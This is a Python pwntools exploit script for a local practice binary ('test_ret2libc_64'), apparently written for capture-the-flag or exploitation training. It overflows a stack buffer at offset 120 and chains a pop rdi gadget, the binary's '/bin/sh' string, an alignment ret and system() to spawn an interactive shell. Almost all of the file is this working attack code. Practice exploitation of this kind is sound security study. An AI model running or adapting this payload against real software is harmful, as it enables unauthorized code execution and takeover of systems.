#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template ./test_ret2libc_64
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or './test_ret2libc_64')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
set follow-fork-mode parent
b *0x0000000000401169
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

io = start()

offset = 120
pop_rdi_ret_addr = 0x40114a
ret_addr = 0x401016
bin_sh_addr = next(exe.search(b'/bin/sh'))
payload = b'a' * offset + p64(pop_rdi_ret_addr) + p64(bin_sh_addr) + p64(ret_addr) + p64(exe.symbols['system'])
io.sendlineafter(b'/bin/sh', payload)

io.interactive()

